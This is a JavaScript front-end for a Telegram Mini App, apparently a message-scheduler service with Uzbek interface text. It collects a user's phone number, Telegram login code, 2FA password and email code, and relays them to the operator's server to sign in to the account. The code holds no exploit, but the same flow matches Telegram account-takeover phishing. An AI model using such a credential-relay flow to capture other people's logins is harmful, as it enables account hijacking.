"use strict";

(() => {
  const telegram = window.Telegram?.WebApp;
  const appMatch = window.location.pathname.match(/\/user-scheduler\/app\/(\d+)\/?$/);
  const $ = (id) => document.getElementById(id);
  let polling = false;
  let phoneNumber = "";
  let otpLength = 5;
  let resendSeconds = 60;
  let resendTimer = null;
  let otpLocked = false;
  let previousOtpLength = 0;
  let codeViewActive = false;

  if (!telegram || !telegram.initData || !appMatch) {
    $("phoneField")?.classList.add("err");
    $("sendBtn")?.setAttribute("disabled", "");
    return;
  }

  telegram.ready();
  telegram.expand();
  try {
    telegram.setHeaderColor("#0e1621");
    telegram.setBackgroundColor("#0e1621");
  } catch {}

  const botId = appMatch[1];
  const pathPrefix = window.location.pathname.replace(/\/user-scheduler\/app\/\d+\/?$/, "");
  const apiBase = `${pathPrefix}/user-scheduler/api/${botId}`;

  function haptic(kind) {
    try {
      if (telegram?.HapticFeedback) {
        if (kind === "tick") telegram.HapticFeedback.impactOccurred("light");
        if (kind === "error") telegram.HapticFeedback.notificationOccurred("error");
        if (kind === "success") telegram.HapticFeedback.notificationOccurred("success");
      }
    } catch {}
  }

  function retrigger(element, className) {
    element.classList.remove(className);
    void element.offsetWidth;
    element.classList.add(className);
  }

  function shake(element) {
    retrigger(element, "shake");
    element.addEventListener("animationend", () => element.classList.remove("shake"), { once: true });
  }

  function setLoading(button, loading) {
    button.classList.toggle("loading", loading);
    button.disabled = loading;
  }

  function setStatus(id, message, type = "") {
    const status = $(id);
    status.textContent = message || "";
    status.className = `status${type ? ` ${type}` : ""}`;
  }

  async function request(action, payload = {}) {
    const response = await fetch(`${apiBase}/${action}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      cache: "no-store",
      credentials: "omit",
      body: JSON.stringify({ initData: telegram.initData, ...payload }),
    });
    let result;
    try {
      result = await response.json();
    } catch {
      throw new Error("Serverdan noto'g'ri javob olindi.");
    }
    if (!response.ok) throw new Error(result.error || "So'rov bajarilmadi.");
    return result;
  }

  function normalizePhoneNumber(value) {
    let normalized = String(value || "").replace(/[^\d+]/g, "");
    normalized = normalized.replace(/(?!^)\+/g, "");
    if (normalized.startsWith("00")) normalized = `+${normalized.slice(2)}`;
    if (/^\d{9,15}$/.test(normalized)) normalized = `+${normalized}`;
    return normalized;
  }

  const icons = {
    phone: '<svg viewBox="0 0 24 24"><rect x="7" y="2.5" width="10" height="19" rx="2.5"/><path d="M11 18.5h2"/></svg>',
    code: '<svg viewBox="0 0 24 24"><path d="M4 5.5h16v10H9.5L5.5 19v-3.5H4z"/><path d="M8 10.5h.01M12 10.5h.01M16 10.5h.01"/></svg>',
    pass: '<svg viewBox="0 0 24 24"><rect x="5" y="10.5" width="14" height="10" rx="2.5"/><path d="M8 10.5V8a4 4 0 0 1 8 0v2.5"/></svg>',
    email: '<svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg>',
    done: '<svg viewBox="0 0 24 24"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg>',
  };

  const views = ["phone", "code", "pass", "email", "email-code", "done"];
  const stepFill = { phone: 1, code: 2, pass: 3, email: 2, "email-code": 3, done: 3 };

  function go(name) {
    views.forEach((view) => {
      $(`v-${view}`).hidden = view !== name;
    });
    $("badge").innerHTML = icons[name] || icons.phone;
    retrigger($("badge"), "bump");
    document.querySelectorAll(".steps i").forEach((element, index) => {
      element.classList.toggle("on", index < stepFill[name]);
    });
  }

  function validatePhone() {
    $("sendBtn").disabled = !(/^\+[1-9]\d{7,14}$/.test(phoneNumber) && $("agree").checked);
  }

  function formatInternationalPhone(value) {
    phoneNumber = normalizePhoneNumber(value);
    if (!phoneNumber) return "";
    const match = phoneNumber.match(/^(\+\d{1,3})(.*)$/);
    if (!match) return phoneNumber;
    const rest = match[2].replace(/\D/g, "").slice(0, 12);
    if (!rest) return match[1];
    if (rest.length <= 3) return `${match[1]} ${rest}`;
    if (rest.length <= 6) return `${match[1]} ${rest.slice(0, 3)} ${rest.slice(3)}`;
    if (rest.length <= 8) {
      return `${match[1]} ${rest.slice(0, 3)} ${rest.slice(3, 6)} ${rest.slice(6)}`;
    }
    return `${match[1]} ${rest.slice(0, 3)} ${rest.slice(3, 6)} ${rest.slice(6, 8)} ${rest.slice(8)}`;
  }

  $("phone").addEventListener("input", (event) => {
    event.target.value = formatInternationalPhone(event.target.value);
    $("phoneField").classList.remove("err");
    validatePhone();
  });

  $("agree").addEventListener("change", () => {
    $("consent").classList.remove("err");
    haptic("tick");
    validatePhone();
  });

  async function pollStatus() {
    if (polling) return;
    polling = true;
    while (polling) {
      await new Promise((resolve) => window.setTimeout(resolve, 1200));
      if (!polling) break;
      try {
        updateView(await request("status"));
      } catch (error) {
        setStatus("codeStatus", error.message, "bad");
        polling = false;
      }
    }
  }

  function buildOtpCells(length) {
    otpLength = Math.min(6, Math.max(3, Number(length) || 5));
    $("otpInput").maxLength = otpLength;
    const container = $("otpCells");
    container.innerHTML = "";
    for (let index = 0; index < otpLength; index++) {
      const cell = document.createElement("div");
      cell.className = "cell";
      cell.style.setProperty("--i", index);
      container.appendChild(cell);
    }
  }

  function renderOtp() {
    const value = $("otpInput").value;
    const cells = [...$("otpCells").querySelectorAll(".cell")];
    cells.forEach((cell, index) => {
      cell.textContent = value[index] || "";
      cell.classList.toggle("filled", Boolean(value[index]));
      cell.classList.toggle("active", document.activeElement === $("otpInput") && index === Math.min(value.length, otpLength - 1));
    });
  }

  function resetOtp() {
    $("otpInput").value = "";
    previousOtpLength = 0;
    otpLocked = false;
    $("otpInput").disabled = false;
    $("otp").classList.remove("bad");
    setStatus("codeStatus", "");
    renderOtp();
  }

  function startTimer(seconds = 60) {
    clearInterval(resendTimer);
    resendSeconds = seconds;
    const button = $("resend");
    button.disabled = true;
    const tick = () => {
      if (resendSeconds <= 0) {
        clearInterval(resendTimer);
        button.disabled = false;
        button.textContent = "Kodni qayta yuborish";
        return;
      }
      button.textContent = `Qayta yuborish: 0:${String(resendSeconds).padStart(2, "0")}`;
      resendSeconds--;
    };
    tick();
    resendTimer = setInterval(tick, 1000);
  }

  $("otpInput").addEventListener("input", async () => {
    if (otpLocked) return;
    const input = $("otpInput");
    input.value = input.value.replace(/\D/g, "").slice(0, otpLength);
    $("otp").classList.remove("bad");
    setStatus("codeStatus", "");
    renderOtp();
    if (input.value.length > previousOtpLength) {
      haptic("tick");
      const cells = [...$("otpCells").querySelectorAll(".cell")];
      for (let index = previousOtpLength; index < input.value.length; index++) {
        retrigger(cells[index], "pop");
      }
    }
    previousOtpLength = input.value.length;
    if (input.value.length === otpLength) await submitCode(input.value);
  });
  $("otp").addEventListener("click", () => $("otpInput").focus());

  async function submitCode(code) {
    otpLocked = true;
    $("otpInput").blur();
    setStatus("codeStatus", "Tekshirilmoqda…");
    try {
      const state = await request("code", { value: code });
      if (state.phase === "error") {
        $("otp").classList.add("bad");
        shake($("otp"));
        haptic("error");
        setStatus("codeStatus", state.message || "Kod noto'g'ri.", "bad");
        await new Promise((resolve) => window.setTimeout(resolve, 650));
        resetOtp();
        $("otpInput").focus();
        return;
      }
      haptic("success");
      setStatus("codeStatus", "Kod tasdiqlandi", "good");
      await new Promise((resolve) => window.setTimeout(resolve, 700));
      updateView(state);
      if (["password", "email", "email-code"].includes(state.phase)) return;
      void pollStatus();
    } catch (error) {
      $("otp").classList.add("bad");
      shake($("otp"));
      haptic("error");
      setStatus("codeStatus", error.message, "bad");
      await new Promise((resolve) => window.setTimeout(resolve, 650));
      resetOtp();
      $("otpInput").focus();
    }
  }

  $("sendBtn").addEventListener("click", async () => {
    const button = $("sendBtn");
    setLoading(button, true);
    try {
      const state = await request("start", { phoneNumber, consent: true });
      updateView(state);
      if (["code", "password", "email", "email-code", "connecting", "processing"].includes(state.phase)) {
        void pollStatus();
      }
    } catch (error) {
      $("phoneField").classList.add("err");
      shake($("phoneField"));
      haptic("error");
    } finally {
      button.classList.remove("loading");
      validatePhone();
    }
  });

  $("resend").addEventListener("click", async () => {
    try {
      await request("cancel");
      const state = await request("start", {
        phoneNumber,
        consent: true,
      });
      updateView(state);
      resetOtp();
      startTimer();
    } catch (error) {
      setStatus("codeStatus", error.message, "bad");
    }
  });

  let passwordShown = false;
  $("eye").innerHTML = '<svg viewBox="0 0 24 24"><path d="M2 12s3.5-6.5 10-6.5S22 12 22 12s-3.5 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="3"/></svg>';
  $("eye").addEventListener("click", () => {
    passwordShown = !passwordShown;
    $("pass").type = passwordShown ? "text" : "password";
  });
  $("pass").addEventListener("input", (event) => {
    $("passBtn").disabled = event.target.value.length < 1;
    $("passField").classList.remove("err");
    setStatus("passStatus", "");
  });
  $("pass").addEventListener("keydown", (event) => {
    if (event.key === "Enter" && !$("passBtn").disabled) $("passBtn").click();
  });
  $("passBtn").addEventListener("click", async () => {
    setLoading($("passBtn"), true);
    try {
      const state = await request("password", { value: $("pass").value });
      updateView(state);
    } catch (error) {
      $("passField").classList.add("err");
      shake($("passField"));
      haptic("error");
      setStatus("passStatus", error.message, "bad");
    } finally {
      $("passBtn").classList.remove("loading");
    }
  });

  $("email").addEventListener("input", (event) => {
    $("emailBtn").disabled = !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(event.target.value.trim());
  });
  $("emailBtn").addEventListener("click", async () => {
    setLoading($("emailBtn"), true);
    try {
      updateView(await request("email", { value: $("email").value.trim() }));
    } catch (error) {
      setStatus("emailStatus", error.message, "bad");
    } finally {
      $("emailBtn").classList.remove("loading");
    }
  });
  $("emailCode").addEventListener("input", (event) => {
    $("emailCodeBtn").disabled = !/^\d{3,12}$/.test(event.target.value.trim());
  });
  $("emailCodeBtn").addEventListener("click", async () => {
    setLoading($("emailCodeBtn"), true);
    try {
      updateView(await request("email-code", { value: $("emailCode").value.trim() }));
    } catch (error) {
      setStatus("emailCodeStatus", error.message, "bad");
    } finally {
      $("emailCodeBtn").classList.remove("loading");
    }
  });

  function cancelLogin() {
    clearInterval(resendTimer);
    polling = false;
    request("cancel")
      .then(updateView)
      .catch((error) => setStatus("codeStatus", error.message, "bad"));
  }
  ["cancelBtn", "cancelBtn2", "cancelBtn3", "cancelBtn4"].forEach((id) => {
    $(id).addEventListener("click", cancelLogin);
  });

  $("closeBtn").addEventListener("click", () => telegram.close());

  function updateView(state) {
    const phase = state.phase || "error";
    if (["idle", "error", "cancelled"].includes(phase)) {
      polling = false;
      codeViewActive = false;
      go("phone");
      $("status")?.replaceChildren();
      return;
    }
    if (phase === "connecting" || phase === "processing") {
      go("code");
      setStatus("codeStatus", state.message || "Tekshirilmoqda…");
      return;
    }
    if (phase === "code") {
      go("code");
      if (!codeViewActive) {
        codeViewActive = true;
        buildOtpCells(state.codeLength || 5);
        resetOtp();
        $("codeSub").textContent = `Telegram yuborgan ${otpLength} xonali kodni kiriting.`;
        startTimer();
        setTimeout(() => $("otpInput").focus(), 350);
      }
      return;
    }
    if (phase === "password") {
      codeViewActive = false;
      go("pass");
      $("passSub").textContent =
        state.passwordHint
          ? `Telegram 2FA paroli. Ishora: ${state.passwordHint}`
          : "Akkauntingizda 2FA yoqilgan. Telegram'da o'rnatgan parolingizni kiriting.";
      setTimeout(() => $("pass").focus(), 350);
      return;
    }
    if (phase === "email") {
      codeViewActive = false;
      go("email");
      return;
    }
    if (phase === "email-code") {
      codeViewActive = false;
      go("email-code");
      $("emailCodeSub").textContent = state.emailPattern
        ? `Kod ${state.emailPattern} manziliga yuborildi.`
        : "Emailga yuborilgan Telegram kodini kiriting.";
      setTimeout(() => $("emailCode").focus(), 350);
      return;
    }
    if (phase === "success" || phase === "connected") {
      polling = false;
      clearInterval(resendTimer);
      go("done");
      haptic("success");
      if (phase === "success") window.setTimeout(() => telegram.close(), 1800);
    }
  }

  async function refreshStatus() {
    try {
      updateView(await request("status"));
    } catch (error) {
      go("phone");
    }
  }

  go("phone");
  void refreshStatus();
})();
